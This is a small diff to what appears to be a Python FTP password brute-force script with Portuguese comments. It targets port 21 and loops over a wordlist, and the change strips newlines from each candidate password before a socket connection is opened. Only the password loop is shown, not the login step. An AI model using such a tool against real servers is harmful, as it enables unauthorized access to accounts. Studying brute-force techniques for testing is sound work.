@@ -37,7 +37,9 @@ print (bcolors.RED + "    ┗━┛╹┗╸┗━┛ ╹ ┗━╸" + bcolors.R
 print (bcolors.YELLOW + " [*] Target %s:%s\n"%(alvo,"21") + bcolors.END)
 
 # Laco de repeticao para testar as senhas
-for senha in f.readlines():
+for palavra in f.readlines():
+    # Remove quebras de linha
+    senha = palavra.strip()
     # Estabelece a conexao
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((alvo,21))
